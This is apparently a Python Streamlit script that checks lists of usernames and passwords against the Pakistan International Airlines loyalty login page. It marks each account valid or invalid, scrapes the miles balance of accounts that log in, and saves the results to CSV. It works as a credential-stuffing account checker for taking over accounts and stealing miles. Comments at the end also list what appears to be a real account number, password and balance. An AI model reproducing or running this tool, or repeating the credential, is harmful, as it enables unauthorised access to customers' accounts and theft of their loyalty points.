import streamlit as st
import requests
import tempfile
import threading
import os
from bs4 import BeautifulSoup

def delete_file_after_delay(file_path, delay=120):
    def delete_file():
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                st.write(f"{file_path} has been deleted after {delay} seconds.")
        except Exception as e:
            st.error(f"Error deleting file: {e}")
    
    timer = threading.Timer(delay, delete_file)
    timer.start()


def account_status_process_for_pia(df):
    st.title('LOGS')

    df['Account Status']  = ''
    df['Account Balance'] = ''

    for index, row in df.iterrows():
        username = row['username']
        password = row['password']

        st.write(f"{index+1} - Attempting login for Username: {username} and {password}")

        if username and password:
            with requests.Session() as session:
                try:
                    login_url = 'https://book-pia.crane.aero/ibe/loyalty?_cid=32875fe2-e860-4dbf-81bb-ec7e461089db'
                    response_get = session.get(login_url)

                    form_data = {
                        'username': username,
                        'password': password,
                        '_cid': '32875fe2-e860-4dbf-81bb-ec7e461089db'
                    }

                    response_post = session.post(login_url, data=form_data)


                    if response_post.status_code == 200:
                        if "Please check your credentials and try again. (ERR008)" in response_post.text:
                            st.error(f"Login failed for {username}.")
                            df.at[index, 'Account Status']  = 'Invalid'
                        elif "Welcome" in response_post.text or "Logout" in response_post.text:
                            soup = BeautifulSoup(response_post.text, 'html.parser')
                            value_element = soup.select_one('#crane > div.container > div.loyalty-cover-detailed.rounded-bottom.loyalty-tier-emerald > div > div.loyalty-cover-balance-container.col-xl-4.col-lg-4.col-md-3.col-4.d-flex.justify-content-end.align-items-center > div > h2')
                            if value_element:
                                value = value_element.get_text(strip=True)
                                st.success(f"Login successful for {username}! with {value} Miles Balance")
                                df.at[index, 'Account Balance'] = value
                            else:
                                st.success(f"Login successful for {username}!")
                            df.at[index, 'Account Status'] = 'Valid'
                        else:
                            st.error(f"Unexpected response for {username}.")
                            df.at[index, 'Account Status'] = 'Unexpected Response'
                    else:
                        st.error(f"Login failed with status code: {response_post.status_code}")
                        st.text(response_post.text)

                except Exception as e:
                    st.error(f"An error occurred for {username}: {e}")
                    df.at[index, 'Account Status'] = f'Error: {e}'

        else:
            st.warning(f"Missing username or password for row {index}.")
            df.at[index, 'Account Status'] = 'Missing Credentials'
    st.divider()



    with tempfile.NamedTemporaryFile(delete=False, suffix="pia_accounts_status.csv") as temp_file:
        df.to_csv(temp_file.name, index=False)
        temp_file_path = temp_file.name
        st.warning(f"Temporary CSV file Created at: {temp_file_path}")

    return df



# https://book-pia.crane.aero/ibe/loyalty
# 3460403705241
# Zxcvbnm1@
# 500 Miles Balance

# https://book-pia.crane.aero/ibe/loyalty?_cid=32875fe2-e860-4dbf-81bb-ec7e461089db

# https://www.piac.com.pk/



# /html/body/div[2]/div/div/div/div[4]/div[1]/div/div[2]/div/h2